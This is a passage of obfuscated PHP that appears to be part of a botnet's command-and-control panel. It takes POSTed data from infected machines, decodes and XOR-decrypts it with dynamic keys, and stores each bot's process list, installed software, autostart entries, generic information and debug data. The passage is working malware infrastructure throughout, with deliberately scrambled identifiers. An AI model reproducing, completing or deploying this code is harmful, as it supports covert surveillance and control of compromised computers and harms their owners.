    global $g_szInfoBlob_DebugInfoName;
    global $g_szInfoBlob_ProcessList;
    global $g_szInfoBlob_InstalledSoftwareList;
    global $g_szInfoBlob_AutostartList;
    global $g_szInfoBlob_GenericList;
    global $g_szInfoBlob_DebugInfo;
    global $g_btPost_DynamicXorKeys;
    $_obfuscated_0D0C0404362C04122A3403242119183532230212322232_ = 0;
    if (strlen($g_szInfoBlob_ProcessListName) == 0 || strlen($g_szInfoBlob_InstalledSoftwareListName) == 0) {
        return 0;
    }
    list($_obfuscated_0D16212E38172A3F39383B260D5C5B3D2A3F160C2B1D32_, $_obfuscated_0D392C0D1C0A13131008330C15290239300618302B1F22_, $_obfuscated_0D16032A313526102C23282B0D15152D3E2D2328102D11_, $_obfuscated_0D09310D1507020612311C0311011A0E1A0A0534193001_) = $g_btPost_DynamicXorKeys;
    if (isset($_POST[(string) $g_szInfoBlob_ProcessListName]) && 0 < strlen($_POST[(string) $g_szInfoBlob_ProcessListName])) {
        $_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_ = _obfuscated_0D313B05283C130A051B2A311D363D19323B163E1F1132_($_POST[(string) $g_szInfoBlob_ProcessListName]);
        if (0 < strlen($_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_)) {
            $_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_ = _obfuscated_0D16390D053330180D2E2B1117353B1E1C331E5B0F1532_($_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_, $g_btPost_DynamicXorKeys);
            if (6 < strlen($_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_)) {
                $botClientObject->InfoBlob_ProcessList = $_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_;
                $_obfuscated_0D0C0404362C04122A3403242119183532230212322232_ += 1;
            }
        }
    }
    if (isset($_POST[(string) $g_szInfoBlob_InstalledSoftwareListName]) && 0 < strlen($_POST[(string) $g_szInfoBlob_InstalledSoftwareListName])) {
        $_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_ = _obfuscated_0D313B05283C130A051B2A311D363D19323B163E1F1132_($_POST[(string) $g_szInfoBlob_InstalledSoftwareListName]);
        if (0 < strlen($_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_)) {
            $_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_ = _obfuscated_0D16390D053330180D2E2B1117353B1E1C331E5B0F1532_($_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_, $g_btPost_DynamicXorKeys);
            if (4 < strlen($_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_)) {
                $botClientObject->InfoBlob_InstalledSoftwareList = $_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_;
                $_obfuscated_0D0C0404362C04122A3403242119183532230212322232_ += 1;
            }
        }
    }
    if (isset($_POST[(string) $g_szInfoBlob_AutostartListName]) && 0 < strlen($_POST[(string) $g_szInfoBlob_AutostartListName])) {
        $_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_ = _obfuscated_0D313B05283C130A051B2A311D363D19323B163E1F1132_($_POST[(string) $g_szInfoBlob_AutostartListName]);
        if (0 < strlen($_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_)) {
            $_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_ = _obfuscated_0D16390D053330180D2E2B1117353B1E1C331E5B0F1532_($_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_, $g_btPost_DynamicXorKeys);
            if (4 < strlen($_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_)) {
                $botClientObject->InfoBlob_AutostartList = $_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_;
                $_obfuscated_0D0C0404362C04122A3403242119183532230212322232_ += 1;
            }
        }
    }
    if (isset($_POST[(string) $g_szInfoBlob_GenericListName]) && 0 < strlen($_POST[(string) $g_szInfoBlob_GenericListName])) {
        $_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_ = _obfuscated_0D313B05283C130A051B2A311D363D19323B163E1F1132_($_POST[(string) $g_szInfoBlob_GenericListName]);
        if (0 < strlen($_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_)) {
            $_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_ = _obfuscated_0D16390D053330180D2E2B1117353B1E1C331E5B0F1532_($_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_, $g_btPost_DynamicXorKeys);
            if (4 < strlen($_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_)) {
                $botClientObject->InfoBlob_Generic = $_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_;
                $_obfuscated_0D0C0404362C04122A3403242119183532230212322232_ += 1;
            }
        }
    }
    if (isset($_POST[(string) $g_szInfoBlob_DebugInfoName]) && 0 < strlen($_POST[(string) $g_szInfoBlob_DebugInfoName])) {
        $_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_ = _obfuscated_0D313B05283C130A051B2A311D363D19323B163E1F1132_($_POST[(string) $g_szInfoBlob_DebugInfoName]);
        if (0 < strlen($_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_)) {
            $_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_ = _obfuscated_0D16390D053330180D2E2B1117353B1E1C331E5B0F1532_($_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_, $g_btPost_DynamicXorKeys);
            if (4 < strlen($_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_)) {
                $botClientObject->InfoBlob_Debug = $_obfuscated_0D0B3817133D5C2419071B2B05041F100A392E37013211_;
                $_obfuscated_0D0C0404362C04122A3403242119183532230212322232_ += 1;
            }
        }
    }
    return $_obfuscated_0D0C0404362C04122A3403242119183532230212322232_;
}

?>